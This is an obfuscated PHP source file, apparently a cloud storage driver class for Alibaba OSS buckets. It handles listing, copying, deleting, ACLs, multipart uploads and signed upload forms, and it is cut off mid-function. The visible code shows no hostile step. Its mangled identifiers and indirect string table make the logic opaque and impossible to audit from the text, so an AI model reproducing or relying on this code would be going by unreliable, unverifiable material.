<?php
 goto EëÇ‰Á½Áš; e«ÀÖÆµ‘: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($š…àŠ¨œ) { parent::__construct(); include_once SDK_DIR . $_SERVER[íû‘ş´][1425]; $this->_init($š…àŠ¨œ); } public function _init($‹™ìÂ‰ğ) { $ÎàøİåÄ =& $_SERVER[íû‘ş´]; $this->config = $‹™ìÂ‰ğ; foreach ($‹™ìÂ‰ğ as $¸…êß¦€ => $Ş±œÉı·) { if (isset($this->{$¸…êß¦€})) { $this->{$¸…êß¦€} = $Ş±œÉı·; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÎàøİåÄ[1426] . LNG($ÎàøİåÄ[1427])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $öñ¹ïÍ¡ =& $_SERVER[íû‘ş´]; $…¾şãÊ† = new OSS\Model\CorsConfig(); $şÂ¶™õœ = new OSS\Model\CorsRule(); $şÂ¶™õœ->addAllowedOrigin($öñ¹ïÍ¡[1428]); $şÂ¶™õœ->addAllowedMethod($öñ¹ïÍ¡[1429]); $şÂ¶™õœ->addAllowedMethod($öñ¹ïÍ¡[1430]); $şÂ¶™õœ->addAllowedMethod($öñ¹ïÍ¡[1431]); $şÂ¶™õœ->addAllowedMethod($öñ¹ïÍ¡[1432]); $şÂ¶™õœ->addAllowedMethod($öñ¹ïÍ¡[161]); $şÂ¶™õœ->setMaxAgeSeconds(600); $şÂ¶™õœ->addExposeHeader($öñ¹ïÍ¡[1433]); $şÂ¶™õœ->addAllowedHeader($öñ¹ïÍ¡[1428]); $…¾şãÊ†->addRule($şÂ¶™õœ); try { $this->client->putBucketCors($this->bucket, $…¾şãÊ†); } catch (OSS\Core\OssException $®÷ÎÔè) { return !1; } return !0; } public function getBucketCors() { $ĞÙ¤£à¦ =& $_SERVER[íû‘ş´]; $¦Œ©—¬ = null; try { $¦Œ©—¬ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $áÎŠëêò) { return null; } if (!$¦Œ©—¬ || !($ÂÆöé¬ = $¦Œ©—¬->getRules())) { return null; } $ƒ±›äåã = $ÂÆöé¬[0]->getAllowedOrigins(); $´Œ˜‚ßÎ = $ÂÆöé¬[0]->getAllowedMethods(); $À«ôëâ¦ = $ÂÆöé¬[0]->getMaxAgeSeconds(); $©ÂòàíÔ = $ÂÆöé¬[0]->getExposeHeaders(); $™ÎÌãäÀ = $ÂÆöé¬[0]->getAllowedHeaders(); return array($ĞÙ¤£à¦[202] => isset($ƒ±›äåã[0]) ? $ƒ±›äåã[0] : $ĞÙ¤£à¦[12], $ĞÙ¤£à¦[206] => $´Œ˜‚ßÎ, $ĞÙ¤£à¦[1434] => $À«ôëâ¦, $ĞÙ¤£à¦[1435] => isset($©ÂòàíÔ[0]) ? $©ÂòàíÔ[0] : $ĞÙ¤£à¦[12], $ĞÙ¤£à¦[204] => isset($™ÎÌãäÀ[0]) ? $™ÎÌãäÀ[0] : $ĞÙ¤£à¦[12]); } public function isBucketCors() { $€ŸøáÄÅ =& $_SERVER[íû‘ş´]; $«ÙĞÊê« = $this->getBucketCors(); if (!$«ÙĞÊê« || !is_array($«ÙĞÊê«)) { return !1; } if ($«ÙĞÊê«[$€ŸøáÄÅ[202]] != $€ŸøáÄÅ[203] || $«ÙĞÊê«[$€ŸøáÄÅ[204]] != $€ŸøáÄÅ[203]) { return !1; } $ÎÖÏı¬¦ = array_map($€ŸøáÄÅ[205], $«ÙĞÊê«[$€ŸøáÄÅ[206]]); if (!is_array($ÎÖÏı¬¦)) { $ÎÖÏı¬¦ = array(); } $÷Ã³‡“ = array($€ŸøáÄÅ[207], $€ŸøáÄÅ[208], $€ŸøáÄÅ[209], $€ŸøáÄÅ[210], $€ŸøáÄÅ[211]); $ƒ±Á³«û = array_diff($÷Ã³‡“, $ÎÖÏı¬¦); return empty($ƒ±Á³«û); } public function mkfile($æ¤ø¾‚‹, $œôŒó… = '', $œÑ‡—õº = REPEAT_RENAME) { $ëŸÉ¶üû = $this->setContent($æ¤ø¾‚‹, $œôŒó…); if ($ëŸÉ¶üû !== !1) { return $this->getPathOuter($æ¤ø¾‚‹); } return !1; } public function mkdir($«ê›÷î, $ƒ¿Ó ÛÛ = REPEAT_SKIP) { if ($ƒ¿Ó ÛÛ && $this->_isFolder($«ê›÷î)) { return $this->getPathOuter($«ê›÷î); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($«ê›÷î)); } catch (OSS\Core\OssException $µî¦åóò) { return !1; } return $this->getPathOuter($«ê›÷î); } private function fileList($é“ƒÈ·Û, $Ê†¯ÏĞ¹ = '', $áäî·€Æ = 0) { $°×Í¹»— =& $_SERVER[íû‘ş´]; $é“ƒÈ·Û = trim($é“ƒÈ·Û, $°×Í¹»—[8]); $„îŞ€Úî = empty($é“ƒÈ·Û) && $é“ƒÈ·Û !== $°×Í¹»—[212] ? $°×Í¹»—[12] : $é“ƒÈ·Û . $°×Í¹»—[8]; $¤®µ®Îß = $°×Í¹»—[12]; $´Ğ³Èşê = 1000; $ĞªªõÊ¦ = $©òâ´¶ = array(); while (!0) { check_abort(); $Ú¡Ì¡„Ø = array($°×Í¹»—[1436] => $Ê†¯ÏĞ¹, $°×Í¹»—[1437] => $„îŞ€Úî, $°×Í¹»—[1438] => $´Ğ³Èşê, $°×Í¹»—[1439] => $¤®µ®Îß); try { $ö™™ª£÷ = $this->client->listObjects($this->bucket, $Ú¡Ì¡„Ø); } catch (OSS\Core\OssException $­ª¬Œ) { break; } $¤®µ®Îß = $ö™™ª£÷->getNextMarker(); $¡îÕü = $ö™™ª£÷->getObjectList(); $“¤‹³µÙ = $ö™™ª£÷->getPrefixList(); foreach ($¡îÕü as $ßÕ¥®ß) { if ($ßÕ¥®ß->getKey() == $„îŞ€Úî) { continue; } $¿Ù‰‡ë¡ = $ßÕ¥®ß->getKey(); $íé¯¦£í = $ßÕ¥®ß->getSize(); $Ğ–Ê·© = $ßÕ¥®ß->getLastModified(); $‡‚îÕÛç = trim($ßÕ¥®ß->getETag(), $°×Í¹»—[118]); $ìøœ’‡ = $áäî·€Æ ? array($°×Í¹»—[32] => $¿Ù‰‡ë¡, $°×Í¹»—[76] => $íé¯¦£í, $°×Í¹»—[194] => strtotime($Ğ–Ê·©), $°×Í¹»—[1440] => $‡‚îÕÛç) : $¿Ù‰‡ë¡; $òöçÓ’ = $íé¯¦£í == 0 && substr($¿Ù‰‡ë¡, strlen($¿Ù‰‡ë¡) - 1, 1) == $°×Í¹»—[8] ? !0 : !1; $ù³±Ì’é = array($°×Í¹»—[76] => $íé¯¦£í, $°×Í¹»—[1441] => $íé¯¦£í, $°×Í¹»—[85] => strtotime($Ğ–Ê·©), $°×Í¹»—[1442] => $Ğ–Ê·©, $°×Í¹»—[1440] => $‡‚îÕÛç); $this->cacheMethodInfoSet($¿Ù‰‡ë¡, $òöçÓ’, $ù³±Ì’é); if ($òöçÓ’) { $ĞªªõÊ¦[] = $¿Ù‰‡ë¡; continue; } $©òâ´¶[] = $ìøœ’‡; } foreach ($“¤‹³µÙ as $–µğë) { $ĞªªõÊ¦[] = $–µğë->getPrefix(); $this->cacheMethodInfoSet($–µğë->getPrefix(), !0); } if ($¤®µ®Îß === $°×Í¹»—[12]) { break; } } $this->cacheMethodInfoSet($é“ƒÈ·Û, !0); return array($°×Í¹»—[82] => $ĞªªõÊ¦, $°×Í¹»—[83] => $©òâ´¶); } public function copyFile($·î³×«Ğ, $ À‰·¬) { $Ï¿ö…ƒŞ = $this->size($·î³×«Ğ); if ($Ï¿ö…ƒŞ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $·î³×«Ğ, $this->bucket, $this->pathEncode($ À‰·¬)); } catch (OSS\Core\OssException $ÖÙ÷©„³) { return !1; } return $this->getPathOuter($ À‰·¬); } $ÁúÈ®¢‹ = $this->multiCopyObject($·î³×«Ğ, $ À‰·¬, $Ï¿ö…ƒŞ); return $ÁúÈ®¢‹ ? $this->getPathOuter($ À‰·¬) : !1; } private function multiCopyObject($€…­Í‡ï, $ÓôÉ§Ÿ, $Ôâ‚©«ï) { $ò”Ì›¡ =& $_SERVER[íû‘ş´]; try { $â›Á¸ÆÙ = array(); if ($ÕöºÒ = $this->hashMd5($€…­Í‡ï)) { $â›Á¸ÆÙ = array(OSS\OssClient::OSS_HEADERS => array($ò”Ì›¡[1443] => $ÕöºÒ)); } $ñ©ññï” = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÓôÉ§Ÿ), $â›Á¸ÆÙ); $¹¿îÄ•º = 1; $¶Ã²×­­ = 0; $ò¶Êšø¦ = array(); $¯ãŸ¦° = 1024 * 1024 * 10; $îò’İ‹Á = $this->client->generateMultiuploadParts($Ôâ‚©«ï, $¯ãŸ¦°); foreach ($îò’İ‹Á as $ÕõÕÌÉÉ => $öÑƒ†ø˜) { $µ á™š = $¶Ã²×­­ + (int) $öÑƒ†ø˜[$ò”Ì›¡[1444]]; $ßµÉÀÍø = (int) $öÑƒ†ø˜[$ò”Ì›¡[381]] + $µ á™š - 1; $½Ñü„ã¡ = array($ò”Ì›¡[1445] => $µ á™š, $ò”Ì›¡[1446] => $ßµÉÀÍø); $ò¶Êšø¦[] = $this->client->uploadPartCopy($this->bucket, $€…­Í‡ï, $this->bucket, $this->pathEncode($ÓôÉ§Ÿ), $¹¿îÄ•º, $ñ©ññï”, $½Ñü„ã¡); $¹¿îÄ•º = $¹¿îÄ•º + 1; } $²‚ßÊĞ¾ = array(); foreach ($ò¶Êšø¦ as $ÕõÕÌÉÉ => $ìÛò–êÓ) { $²‚ßÊĞ¾[] = array($ò”Ì›¡[1447] => $ÕõÕÌÉÉ + 1, $ò”Ì›¡[1448] => $ìÛò–êÓ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ÓôÉ§Ÿ), $ñ©ññï”, $²‚ßÊĞ¾); } catch (OSS\Core\OssException $Ô¦ƒŸ¸¹) { return !1; } return !0; } public function moveFile($šƒâôĞ, $ÏÛ·½ú¶) { if ($this->copyFile($šƒâôĞ, $ÏÛ·½ú¶)) { $this->remove($šƒâôĞ); return $this->getPathOuter($ÏÛ·½ú¶); } return !1; } public function delFile($É­æàçÄ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($É­æàçÄ)); } catch (OSS\Core\OssException $É Â®µ˜) { return !1; } return !0; } public function delFolder($ş ù¨‚À) { $û¯Æ‚¹» =& $_SERVER[íû‘ş´]; if (!$this->exist($ş ù¨‚À)) { return !0; } $this->listItemCache = !1; $™ƒ™€…ß = $this->fileList($ş ù¨‚À); $this->listItemCache = !0; $¿”„ö©£ = trim($ş ù¨‚À, $û¯Æ‚¹»[8]) . $û¯Æ‚¹»[8]; if (!empty($ş ù¨‚À) && $ş ù¨‚À !== $û¯Æ‚¹»[212] && !in_array($¿”„ö©£, $™ƒ™€…ß[$û¯Æ‚¹»[82]])) { $™ƒ™€…ß[$û¯Æ‚¹»[82]][] = $¿”„ö©£; } $®…¿à²œ = $this->delByBatch($™ƒ™€…ß[$û¯Æ‚¹»[83]]); if (!$®…¿à²œ) { return !1; } $®…¿à²œ = $this->delByBatch($™ƒ™€…ß[$û¯Æ‚¹»[82]]); if (!$®…¿à²œ) { return !1; } return $this->delFile($¿”„ö©£); } private function delByBatch($°†¸ñˆ) { foreach (array_chunk($°†¸ñˆ, 1000) as $ªÔì…º¸) { try { $this->client->deleteObjects($this->bucket, $ªÔì…º¸); } catch (OSS\Core\OssException $·ŞÉ¶ª) { return !1; } } return !0; } public function rename($½Àôğñ, $ËŒ“’äÚ) { return $this->renameObject($½Àôğñ, $ËŒ“’äÚ); } private function fileInfo($äå…õå, $èÚ›áî = false, $ƒÁ×Ò¡Ê = array()) { $üÙöœ =& $_SERVER[íû‘ş´]; $¬³§¹¥Ö = array($üÙöœ[32] => $this->pathThis($äå…õå), $üÙöœ[84] => $this->getPathOuter($äå…õå), $üÙöœ[33] => $üÙöœ[214], $üÙöœ[76] => isset($ƒÁ×Ò¡Ê[$üÙöœ[76]]) ? $ƒÁ×Ò¡Ê[$üÙöœ[76]] : 0, $üÙöœ[175] => $this->ext($äå…õå)); if ($èÚ›áî) { return $¬³§¹¥Ö; } $¬³§¹¥Ö[$üÙöœ[215]] = $¬³§¹¥Ö[$üÙöœ[85]] = 0; $¬³§¹¥Ö[$üÙöœ[216]] = $¬³§¹¥Ö[$üÙöœ[217]] = !0; if (empty($ƒÁ×Ò¡Ê)) { $ÚÒÑş Ø = $this->objectMeta($äå…õå); if (!$ÚÒÑş Ø) { return $¬³§¹¥Ö; } $ƒÁ×Ò¡Ê = array($üÙöœ[85] => strtotime($ÚÒÑş Ø[$üÙöœ[1442]]), $üÙöœ[76] => $ÚÒÑş Ø[$üÙöœ[1441]] + 0, $üÙöœ[1440] => $ÚÒÑş Ø[$üÙöœ[1440]]); } if (isset($ƒÁ×Ò¡Ê[$üÙöœ[1440]]) && $ƒÁ×Ò¡Ê[$üÙöœ[1440]]) { $¬³§¹¥Ö[$üÙöœ[219]] = trim($ƒÁ×Ò¡Ê[$üÙöœ[1440]], $üÙöœ[118]); } if (isset($ƒÁ×Ò¡Ê[$üÙöœ[76]])) { $¬³§¹¥Ö[$üÙöœ[76]] = $ƒÁ×Ò¡Ê[$üÙöœ[76]]; } if (isset($ƒÁ×Ò¡Ê[$üÙöœ[85]])) { $¬³§¹¥Ö[$üÙöœ[85]] = $ƒÁ×Ò¡Ê[$üÙöœ[85]]; } if (isset($ƒÁ×Ò¡Ê[$üÙöœ[194]]) && !trim($¬³§¹¥Ö[$üÙöœ[85]])) { $¬³§¹¥Ö[$üÙöœ[85]] = $ƒÁ×Ò¡Ê[$üÙöœ[194]]; } return $¬³§¹¥Ö; } private function folderInfo($¤ıº½, $«»¥ë’® = false, $¤†œ‰Æ† = array()) { $¢ñ·Û™î =& $_SERVER[íû‘ş´]; $Š††ãĞØ = array($¢ñ·Û™î[32] => $this->pathThis($¤ıº½), $¢ñ·Û™î[84] => $this->getPathOuter($¢ñ·Û™î[8] . $¤ıº½), $¢ñ·Û™î[33] => $¢ñ·Û™î[75]); if ($«»¥ë’®) { return $Š††ãĞØ; } $Š††ãĞØ[$¢ñ·Û™î[215]] = $Š††ãĞØ[$¢ñ·Û™î[85]] = 0; $Š††ãĞØ[$¢ñ·Û™î[216]] = $Š††ãĞØ[$¢ñ·Û™î[217]] = !0; if (empty($¤†œ‰Æ†)) { $¤ıº½ = rtrim($¤ıº½, $¢ñ·Û™î[8]) . $¢ñ·Û™î[8]; $‹£²µ± = $this->objectMeta($¤ıº½); if (!$‹£²µ±) { return $Š††ãĞØ; } $¤†œ‰Æ† = array($¢ñ·Û™î[215] => $‹£²µ±[$¢ñ·Û™î[554]][$¢ñ·Û™î[1449]], $¢ñ·Û™î[85] => strtotime($‹£²µ±[$¢ñ·Û™î[1442]])); } if (isset($¤†œ‰Æ†[$¢ñ·Û™î[85]])) { $Š††ãĞØ[$¢ñ·Û™î[85]] = $¤†œ‰Æ†[$¢ñ·Û™î[85]]; } if (isset($¤†œ‰Æ†[$¢ñ·Û™î[215]])) { $Š††ãĞØ[$¢ñ·Û™î[215]] = $¤†œ‰Æ†[$¢ñ·Û™î[215]]; } return $Š††ãĞØ; } public function listPath($°ÊÖÄ§©, $Ó™ßûáˆ = false) { $÷¸ÙØÓ‰ =& $_SERVER[íû‘ş´]; $ìüû°íª = $this->fileList($°ÊÖÄ§©, $÷¸ÙØÓ‰[8], !0); foreach ($ìüû°íª[$÷¸ÙØÓ‰[82]] as $˜Ğœ™Ê => $Ù¬‘ ÈÙ) { $ìüû°íª[$÷¸ÙØÓ‰[82]][$˜Ğœ™Ê] = $this->folderInfo($Ù¬‘ ÈÙ, $Ó™ßûáˆ, $Ù¬‘ ÈÙ); } foreach ($ìüû°íª[$÷¸ÙØÓ‰[83]] as $˜Ğœ™Ê => $Ù¬‘ ÈÙ) { $ìüû°íª[$÷¸ÙØÓ‰[83]][$˜Ğœ™Ê] = $this->fileInfo($Ù¬‘ ÈÙ[$÷¸ÙØÓ‰[32]], $Ó™ßûáˆ, $Ù¬‘ ÈÙ); } return $ìüû°íª; } protected function infoChildren($¢öÉšÒñ, &$·Ñ»Ò) { $Ñ‡øÆ„ =& $_SERVER[íû‘ş´]; $³×Ö¬’… = $this->fileList($¢öÉšÒñ, $Ñ‡øÆ„[12], !0); $·Ñ»Ò[$Ñ‡øÆ„[78]] += count($³×Ö¬’…[$Ñ‡øÆ„[82]]); $·Ñ»Ò[$Ñ‡øÆ„[77]] += count($³×Ö¬’…[$Ñ‡øÆ„[83]]); foreach ($³×Ö¬’…[$Ñ‡øÆ„[83]] as $Äæ˜†©ï) { if (!$Äæ˜†©ï || !$Äæ˜†©ï[$Ñ‡øÆ„[76]]) { continue; } $·Ñ»Ò[$Ñ‡øÆ„[76]] += $Äæ˜†©ï[$Ñ‡øÆ„[76]]; } } public function has($£ûù•Ü, $±ìŞŠ“¼ = false, $—ƒÄ°â = true) { $æŒ®Êü‹ =& $_SERVER[íû‘ş´]; $£ûù•Ü = trim($£ûù•Ü, $æŒ®Êü‹[8]); $Óù¸ˆÕ = empty($£ûù•Ü) && $£ûù•Ü !== $æŒ®Êü‹[212] ? $æŒ®Êü‹[12] : $£ûù•Ü . $æŒ®Êü‹[8]; $µšé‹ü¥ = $æŒ®Êü‹[12]; $èº˜Ì€­ = 500; $©²Œî˜ = $´Çˆõ  = 0; while (!0) { check_abort(); $ÔĞŸÍ‡® = array($æŒ®Êü‹[1436] => $æŒ®Êü‹[8], $æŒ®Êü‹[1437] => $Óù¸ˆÕ, $æŒ®Êü‹[1438] => $èº˜Ì€­, $æŒ®Êü‹[1439] => $µšé‹ü¥); try { $±ÊÃæ‹È = $this->client->listObjects($this->bucket, $ÔĞŸÍ‡®); } catch (OSS\Core\OssException $³²Š¸«€) { break; } $µšé‹ü¥ = $±ÊÃæ‹È->getNextMarker(); $ªğâÕà = $±ÊÃæ‹È->getObjectList(); $ú–Öø’ç = $±ÊÃæ‹È->getPrefixList(); if ($±ìŞŠ“¼) { if (count($ªğâÕà) > 1 || count($ªğâÕà) == 1 && $ªğâÕà[0]->getKey() != $Óù¸ˆÕ) { $©²Œî˜ += count($ªğâÕà) - 1; } if (!empty($ú–Öø’ç)) { $´Çˆõ  += count($ú–Öø’ç); } if ($µšé‹ü¥ === $æŒ®Êü‹[12]) { break; } continue; } if ($—ƒÄ°â) { if (!empty($ªğâÕà)) { if (count($ªğâÕà) > 1 || $ªğâÕà[0]->getKey() != $Óù¸ˆÕ) { return !0; } } } else { if (!empty($ú–Öø’ç)) { return !0; } } if ($µšé‹ü¥ === $æŒ®Êü‹[12]) { break; } } if ($±ìŞŠ“¼) { return array($æŒ®Êü‹[223] => $©²Œî˜, $æŒ®Êü‹[224] => $´Çˆõ ); } return !1; } public function listAll($¶û²šô) { $ÓµÅ®ü‡ =& $_SERVER[íû‘ş´]; $Ó§¡àÙ = $this->fileList($¶û²šô, $ÓµÅ®ü‡[12], !0); $‚³¾İ”Ü = array_to_keyvalue($Ó§¡àÙ[$ÓµÅ®ü‡[83]], $ÓµÅ®ü‡[32]); foreach ($Ó§¡àÙ[$ÓµÅ®ü‡[82]] as $˜€ö“Úı) { if (is_string($˜€ö“Úı)) { $‚³¾İ”Ü[$˜€ö“Úı] = array($ÓµÅ®ü‡[76] => 0); } } return $this->listAllFiles($¶û²šô, $‚³¾İ”Ü); } public function canRead($ª¯Å›¤±) { $ôìúªâ =& $_SERVER[íû‘ş´]; $ÒŞ„€Ô¢ = $this->pathAcl($ª¯Å›¤±); return $ÒŞ„€Ô¢ == $ôìúªâ[1450] || $ÒŞ„€Ô¢ == $ôìúªâ[597] ? !0 : !1; } public function canWrite($Ê¥·¯É) { $‰ãß¬É¹ = $this->pathAcl($Ê¥·¯É); return $‰ãß¬É¹ == $_SERVER[íû‘ş´][597] ? !0 : !1; } public function pathAcl($¥¯óé“‹) { $šğŸ‡’¶ =& $_SERVER[íû‘ş´]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $’Îƒ°Ë = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¥¯óé“‹)); } catch (OSS\Core\OssException $¥ìÖïó™) { return !1; } $ˆääóñê = $’Îƒ°Ë == $šğŸ‡’¶[37] ? $this->bucketAcl : $’Îƒ°Ë; if ($ˆääóñê == $šğŸ‡’¶[1451]) { return $šğŸ‡’¶[1450]; } if ($ˆääóñê == $šğŸ‡’¶[1452]) { return $šğŸ‡’¶[597]; } return $ˆääóñê; } private function chmodPath($İ÷õ Üé, $ıï€Ã¥é = '') { $™…Œñú´ =& $_SERVER[íû‘ş´]; $é®è¥¾õ = empty($ıï€Ã¥é) ? $™…Œñú´[1452] : $ıï€Ã¥é; $ØŒ¢¸¦– = array($™…Œñú´[37], $™…Œñú´[213], $™…Œñú´[1451], $™…Œñú´[1452]); if (!in_array($é®è¥¾õ, $ØŒ¢¸¦–)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($İ÷õ Üé), $é®è¥¾õ); } catch (OSS\Core\OssException $¹ä£š) { return !1; } return !0; } public function getContent($›”ƒÇÃß) { return $this->fileSubstr($›”ƒÇÃß, -1); } public function setContent($ê¯ì—Û©, $åî¬ò™“ = '') { $ò§„ïí =& $_SERVER[íû‘ş´]; try { $äõÜ€†Ÿ = $this->trafficLimit($ò§„ïí[1453]); $³”üşÕò = $this->client->putObject($this->bucket, $this->pathEncode($ê¯ì—Û©), $åî¬ò™“, $äõÜ€†Ÿ); } catch (OSS\Core\OssException $« Âù›½) { return !1; } $ñÉì£Ñ‚ = array($ò§„ïí[1443] => trim($³”üşÕò[$ò§„ïí[1440]], $ò§„ïí[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ê¯ì—Û©))); $this->updateObjMeta($ê¯ì—Û©, $ñÉì£Ñ‚); return isset($³”üşÕò[$ò§„ïí[1454]][$ò§„ïí[275]]) ? !0 : !1; } private function updateObjMeta($Ü¬å±ŸÒ, $ö™±É‚è) { $Ü¬å±ŸÒ = $this->pathEncode($Ü¬å±ŸÒ); try { $ì¢¬â¬¨ = array(OSS\OssClient::OSS_HEADERS => $ö™±É‚è); $this->client->copyObject($this->bucket, $Ü¬å±ŸÒ, $this->bucket, $Ü¬å±ŸÒ, $ì¢¬â¬¨); } catch (OSS\Core\OssException $ø³Ùî³) { return !1; } return !0; } public function upload($íôÌšıİ, $Û›­–ÔÏ, $Ê‚÷„Ï› = false, $‚İÕ“™â = REPEAT_REPLACE) { $²íÄŒî¿ =& $_SERVER[íû‘ş´]; $Ú™âçƒÑ = trim($íôÌšıİ, $²íÄŒî¿[8]); $¬ûóí¹à = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($²íÄŒî¿[1443] => @md5_file($Û›­–ÔÏ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($íôÌšıİ))); $¬ûóí¹à = $this->trafficLimit($²íÄŒî¿[1453], $¬ûóí¹à); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Ú™âçƒÑ), $Û›­–ÔÏ, $¬ûóí¹à); } catch (OSS\Core\OssException $ò‰£¿¯•) { return !1; } return $this->getPathOuter($íôÌšıİ); } public function getHost() { $šõÀÁè£ =& $_SERVER[íû‘ş´]; $³Ë©”¸» = explode($šõÀÁè£[198], parent::getHost()); return $³Ë©”¸»[0] . $šõÀÁè£[198] . $this->bucket . $šõÀÁè£[10] . $³Ë©”¸»[1]; } public function uploadFormData($˜Å¾šÕ», $İ˜ï÷ã† = 3600) { $Ëúø·÷Ä =& $_SERVER[íû‘ş´]; if (!($íµõÜï³ = $this->getHost())) { return !1; } $—¸ˆ¸ÁÈ = $İ˜ï÷ã†; $™¢ó«Ù = date($Ëúø·÷Ä[1455], time() + $—¸ˆ¸ÁÈ); $¿Ì¤•ø§ = new DateTime($™¢ó«Ù); $ÕÒË¸“€ = $¿Ì¤•ø§->format(DateTime::ISO8601); $¼˜úùÆı = strpos($ÕÒË¸“€, $Ëúø·÷Ä[340]); $ÕÒË¸“€ = substr($ÕÒË¸“€, 0, $¼˜úùÆı) . $Ëúø·÷Ä[1456]; $©íŞáÄ = 1048576000 * 5; $ğŒ‹¬—ª = $this->pathFather($˜Å¾šÕ»); $œšÁÛ¦ì = array($Ëúø·÷Ä[258] => $ÕÒË¸“€, $Ëúø·÷Ä[261] => array(array($Ëúø·÷Ä[1457], 0, $©íŞáÄ), array($Ëúø·÷Ä[264], $Ëúø·÷Ä[265], $ğŒ‹¬—ª))); $ñÏ¯¸ãÓ = base64_encode(json_encode($œšÁÛ¦ì)); $ˆ±âÉ« = base64_encode(hash_hmac($Ëúø·÷Ä[247], $ñÏ¯¸ãÓ, $this->secret, !0)); $íï²óŠÖ = array($Ëúø·÷Ä[276] => $ñÏ¯¸ãÓ, $Ëúø·÷Ä[1458] => $this->accessKey, $Ëúø·÷Ä[268] => $Ëúø·÷Ä[257], $Ëúø·÷Ä[1459] => $ˆ±âÉ«, $Ëúø·÷Ä[196] => $íµõÜï³); $íï²óŠÖ = $this->trafficLimit($Ëúø·÷Ä[1453], $íï²óŠÖ); return $íï²óŠÖ; } public function multiUploadFormData($´í•Ù€È, $ıİ­«Æ = 3600) { $¼Ÿ»ÔŠâ =& $_SERVER[íû‘ş´]; if (!($î‘¸¿·µ = $this->getHost())) { return !1; } $ù²×‚É = $this->trafficLimit($¼Ÿ»ÔŠâ[1453]); $Şì‰ø°‘ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($´í•Ù€È), $ù²×‚É); return array($¼Ÿ»ÔŠâ[238] => $Şì‰ø°‘, $¼Ÿ»ÔŠâ[196] => $î‘¸¿·µ . $¼Ÿ»ÔŠâ[8] . $this->pathEncode($´í•Ù€È), $¼Ÿ»ÔŠâ[239] => gmdate($¼Ÿ»ÔŠâ[1460]), $¼Ÿ»ÔŠâ[94] => $´í•Ù€È); } public function multiUploadAuthData($¾æ²Ë÷Ÿ, $ú°¦¼·ƒ = array()) { $²ìİ‹ßŸ =& $_SERVER[íû‘ş´]; $æ‚×…ş = isset($ú°¦¼·ƒ[$²ìİ‹ßŸ[239]]) ? $ú°¦¼·ƒ[$²ìİ‹ßŸ[239]] : gmdate($²ìİ‹ßŸ[1460]); $ÓÚ¼ƒíô = isset($ú°¦¼·ƒ[$²ìİ‹ßŸ[175]]) ? $ú°¦¼·ƒ[$²ìİ‹ßŸ[175]] : $²ìİ‹ßŸ[12]; $š¹ÌÂ×Ã = $¾æ²Ë÷Ÿ; if (isset($ú°¦¼·ƒ[$²ìİ‹ßŸ[94]])) { $š¹ÌÂ×Ã = $ú°¦¼·ƒ[$²ìİ‹ßŸ[94]]; unset($ú°¦¼·ƒ[$²ìİ‹ßŸ[94]]); } if (isset($ú°¦¼·ƒ[$²ìİ‹ßŸ[240]])) { $ú°¦¼·ƒ[$²ìİ‹ßŸ[239]] = $æ‚×…ş; return $this->listUploadParts($š¹ÌÂ×Ã, $ú°¦¼·ƒ); } $ğ¿ÚÍÛó = array($²ìİ‹ßŸ[241], $²ìİ‹ßŸ[12], $²ìİ‹ßŸ[120], $æ‚×…ş, "\170\55\157\163\x73\x2d\x64\x61\164\x65\72{$æ‚×…ş}", $²ìİ‹ßŸ[8] . $this->bucket . $²ìİ‹ßŸ[8] . $š¹ÌÂ×Ã . $ÓÚ¼ƒíô); if (strpos($ÓÚ¼ƒíô, $²ìİ‹ßŸ[242]) === 0) { $ğ¿ÚÍÛó[0] = $²ìİ‹ßŸ[243]; if ($¢ãØèµ‰ = $this->trafficLimit($²ìİ‹ßŸ[1453])) { $š¹ÌÂ×Ã = $²ìİ‹ßŸ[1461]; array_splice($ğ¿ÚÍÛó, 5, 0, $š¹ÌÂ×Ã . $²ìİ‹ßŸ[4] . $¢ãØèµ‰[$š¹ÌÂ×Ã]); } } if (isset($ú°¦¼·ƒ[$²ìİ‹ßŸ[244]]) && $ú°¦¼·ƒ[$²ìİ‹ßŸ[244]] == $²ìİ‹ßŸ[245]) { $ğ¿ÚÍÛó[0] = $²ìİ‹ßŸ[245]; } if (!empty($ú°¦¼·ƒ[$²ìİ‹ßŸ[1462]])) { $á Ÿ¡ïÖ = array_merge(array($ğ¿ÚÍÛó[4]), $ú°¦¼·ƒ[$²ìİ‹ßŸ[1462]]); sort($á Ÿ¡ïÖ); $ğ¿ÚÍÛó[4] = implode($²ìİ‹ßŸ[246], $á Ÿ¡ïÖ); } $‚ªüÄÃÓ = implode($²ìİ‹ßŸ[246], $ğ¿ÚÍÛó); $İ„‰ÈâÊ = base64_encode(hash_hmac($²ìİ‹ßŸ[247], $‚ªüÄÃÓ, $this->secret, !0)); $¿éôÉ¯ = $²ìİ‹ßŸ[1426] . $this->accessKey . $²ìİ‹ßŸ[4] . $İ„‰ÈâÊ; if (strpos($ÓÚ¼ƒíô, $²ìİ‹ßŸ[242]) === 0) { $¿éôÉ¯ = array($²ìİ‹ßŸ[249] => $¿éôÉ¯, $²ìİ‹ßŸ[239] => $æ‚×…ş); if ($¢ãØèµ‰) { $¿éôÉ¯ = array_merge($¿éôÉ¯, $¢ãØèµ‰); } } return $¿éôÉ¯; } public function listUploadParts($ÚúĞ¬, 